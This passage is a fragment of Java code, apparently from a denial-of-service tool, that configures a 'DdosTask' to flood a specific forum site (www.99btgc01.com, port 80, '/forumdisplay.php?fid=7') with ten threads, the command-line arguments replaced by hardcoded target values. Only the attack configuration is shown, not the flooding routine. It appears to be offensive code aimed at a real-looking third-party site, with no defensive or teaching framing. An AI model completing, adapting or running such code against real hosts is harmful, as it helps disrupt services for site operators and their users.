...
//        }
        DdosTask m = new DdosTask();
        m.host = "www.99btgc01.com";//args[0];
        m.port = 80;//Integer.valueOf(args[1]);
        m.uri ="/forumdisplay.php";//args[3];
        m.param = "fid=7";//args[4];
        m.threadsCount =10; //Integer.valueOf(args[2]);
        m.timeout = 2000;//Long.valueOf(args[5]);
